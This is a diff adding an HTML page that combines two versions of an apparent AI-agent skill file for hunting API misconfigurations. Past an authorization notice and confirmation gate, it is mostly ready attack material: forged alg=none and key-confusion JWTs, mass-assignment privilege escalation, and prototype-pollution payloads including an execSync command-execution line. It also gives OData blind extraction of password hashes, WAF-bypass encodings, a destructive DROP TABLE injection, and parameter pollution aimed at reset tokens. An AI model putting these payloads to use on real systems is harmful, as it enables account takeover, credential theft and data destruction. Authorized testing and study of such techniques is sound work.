@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-api-misconfig</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">api-misconfig-hunt</a> / hunt-api-misconfig</p><h1>hunt-api-misconfig</h1><p class="meta">combined</p><p>Both copies cover the same core API misconfiguration classes (mass assignment, JWT alg=none, RS256→HS256 confusion, prototype pollution), but each contains material steps the other lacks. The uphiago copy adds HTTP verb tampering, CORS exploitation, and a detailed OData WAF-bypass section. The sickn33 copy adds a mandatory authorization gate, a detailed prototype-pollution hunt sequence (marker pollution, sink triggering, escalation), and a server-side parameter pollution hunt sequence. Crowning one would hide the other&#x27;s unique procedures and constraints.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-api-misconfig/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-api-misconfig/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-api-misconfig/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-api-misconfig/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-api-misconfig/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-api-misconfig/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-api-misconfig
+description: &quot;Hunt API security misconfiguration — mass assignment, JWT attacks, prototype pollution, HTTP verb tampering, OData WAF bypass, server-side parameter pollution.&quot;
+version: 1.2.0
+license: MIT
+category: redteam
+tags: [api, misconfiguration, hunt, redteam, security]
+---
+
+&gt; **AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+&gt; Misuse of this tool is illegal and strictly prohibited.
+
+&gt; **Mandatory confirmation gate**
+&gt; Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+&gt; 1. Ask the user to state the exact target URL, IP, account, or resource.
+&gt; 2. Ask the user to confirm written authorization and the permitted scope.
+&gt; 3. Show the exact command(s) and explain their expected effect.
+&gt; 4. Wait for explicit confirmation in the current conversation.
+&gt;
+&gt; Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## 1. Mass Assignment
+
+Send privileged fields on profile/account/reset endpoints where the server blindly applies the request body.
+
+```javascript
+User.update(req.body)  // body has {&quot;role&quot;: &quot;admin&quot;} → privilege escalation
+```
+
+Test payloads: `{&quot;is_admin&quot;:true, &quot;role&quot;:&quot;admin&quot;, &quot;verified&quot;:true}` on profile, account, and reset endpoints.
+
+## 2. JWT Attacks
+
+### 2a. None Algorithm
+
+```python
+header = {&quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;}
+payload = {&quot;sub&quot;: 1, &quot;role&quot;: &quot;admin&quot;}
+token = base64(header) + &quot;.&quot; + base64(payload) + &quot;.&quot;  # no signature
+```
+
+### 2b. RS256 → HS256 Algorithm Confusion
+
+```python
+# Get server&#x27;s public key from /.well-known/jwks.json
+# Sign token with public key as HMAC secret
+token = jwt.encode({&quot;sub&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;}, pub_key, algorithm=&quot;HS256&quot;)
+# Server uses RS256 key as HS256 secret → accepts it
+```
+
+### 2c. Other JWT vectors
+
+- Weak HMAC secret bruteforce
+- `kid` path traversal
+- JWK injection
+- Token confusion between RS256 and HS256
+
+Detection: decode JWTs found in headers at jwt.io; look for API responses with extra fields.
+
+## 3. Prototype Pollution
+
+### 3a. Payloads
+
+```javascript
+// Server-side — Node.js merge without protection
+{&quot;__proto__&quot;: {&quot;admin&quot;: true}}
+{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;admin&quot;: true}}}
+// URL: ?__proto__[isAdmin]=true&amp;__proto__[role]=superadmin
+```
+
+### 3b. Hunt sequence
+
+For server-side prototype pollution, hunt for an object merge primitive first, then a sink. Favor JSON/object update endpoints such as profile, address, preferences, settings, cart, admin job, import, or webhook configuration. Do not stop at a 200 response to `__proto__`; prove that polluted prototype state reaches a later operation.
+
+1. **Find an object-update endpoint.** Prefer endpoints that accept many named fields or JSON objects. Try both JSON and form encodings when the app accepts forms. Include CSRF/session fields when needed.
+2. **Pollute harmless marker properties.** Send variants such as:
+
+```
+{&quot;__proto__&quot;:{&quot;polluted&quot;:&quot;pp-1337&quot;}}
+{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;polluted&quot;:&quot;pp-1337&quot;}}}
+__proto__[polluted]=pp-1337
+constructor[prototype][polluted]=pp-1337
+```
+
+3. **Trigger a separate sink.** After pollution, request account/profile/admin/job/export/search/render endpoints and compare with baseline. Strong signals include changed JSON defaults, unexpected fields, server errors mentioning object properties, changed job output, template/render errors, or command/job behavior changes.
+4. **Escalate only through learned sinks.** Candidate properties depend on the sink:
+
+```
+{&quot;__proto__&quot;:{&quot;json spaces&quot;:10}}
+{&quot;__proto__&quot;:{&quot;status&quot;:555}}
+{&quot;__proto__&quot;:{&quot;isAdmin&quot;:true,&quot;role&quot;:&quot;admin&quot;}}
+{&quot;__proto__&quot;:{&quot;shell&quot;:&quot;/bin/bash&quot;,&quot;argv0&quot;:&quot;node&quot;,&quot;NODE_OPTIONS&quot;:&quot;--inspect&quot;}}
+{&quot;__proto__&quot;:{&quot;execArgv&quot;:[&quot;--eval&quot;,&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&quot;]}}
+```
+
+5. **For exfiltration labs or real impact, prefer non-destructive proof.** If an admin job, diagnostic, export, or rendering endpoint consumes polluted defaults, use a marker or environment/secret read only when authorized. In production, stop at a controlled marker unless scope explicitly permits data access.
+
+## 4. HTTP Verb Tampering
+
+- GET-bypass-CSRF: send sensitive operations via GET
+- X-HTTP-Method-Override: override POST to PUT/DELETE
+- TRACE enabled: check for TRACE method support
+
+## 5. CORS Exploitation
+
+```bash
+# Test: reflected origin + credentials
+curl --max-time 30 --connect-timeout 10 -s -I -H &quot;Origin: https://evil.com&quot; https://target.com/api/user/me
+# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
+# → CRITICAL: attacker reads credentialed responses
+```
+
+Also test: null origin, subdomain-regex bypass, postMessage.
+
+## 6. OData WAF-Blacklist Bypass
+
+OData is the query layer behind SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori, and ASP.NET WebAPI projects using Microsoft.AspNetCore.OData. It exposes SQL-shaped query operators that keyword-blacklist WAFs routinely fail open on.
+
+### 6a. Boolean-logic blind extraction via startswith / substringof
+
+```
+GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,&#x27;a&#x27;)
+GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,&#x27;aa&#x27;)
+```
+
+Iterate prefix character-by-character; cardinality of the response (or @odata.count) is the boolean oracle.
+
+### 6b. $orderby / $select column-disclosure bypass
+
+```
+GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&amp;$select=fullname
+```
+
+Column-level ACLs are enforced on $select but NOT on $orderby / $filter.
+
+### 6c. $batch multipart/mixed → per-request WAF signatures miss sub-operations
+
+```
+POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
+--batch_1
+Content-Type: application/http
+GET Users?$filter=1 eq 1 HTTP/1.1
+--batch_1--
+```
+
+### 6d. Encoded / non-canonical operator → keyword-blacklist bypass
+
+```
+GET /api?%24filter=Name%20eq%20&#x27;x&#x27;%20or%201%20eq%201
+GET /api?%2524filter=...
+GET /Users(1)/$value
+```
+
+### 6e. OData → real SQLi when library passes filter raw
+
+```
+$filter=Name eq &#x27;x&#x27;); DROP TABLE Users--&#x27;
+```
+
+Only triggers when the OData layer string-concatenates into SQL instead of using LINQ.
+
+## 7. Server-Side Parameter Pollution in Backend URL / REST URL Construction
+
+Use this when a frontend form or endpoint appears to call a server-side API on your behalf (password reset, account lookup, profile fetch, product lookup, stock check, search). The server takes your input and interpolates it into a backend URL path or query string.
+
+Hunt sequence:
+
+1. **Find the flow and read the client request.** Fetch the page and any referenced JavaScript. Look for form actions, fetch(...), hidden CSRF fields, and the exact parameter name the browser sends.
+2. **Determine whether input lands in a backend path or query.** Send URL metacharacters in the input: #, ?, &amp;x=y, /, ../, and encoded forms %23, %3f, %26x=y, %2f, %2e%2e%2f. Distinct errors mean your value is being interpreted by a server-side URL router.
+3. **Use path traversal to move inside the server-side URL.** If username/../other-user changes the referenced account, the input is in a REST path segment. Then try appending route fragments such as /field/email, /field/id, /field/username, /field/passwordResetToken, and terminate the rest of the original backend path with # or %23 when the backend URL parser honors fragments.
+4. **Discover API documentation from errors.** When an error says to consult the API definition, probe common documentation/spec paths: /openapi.json, /swagger.json.</pre>
+</body>
+</html>
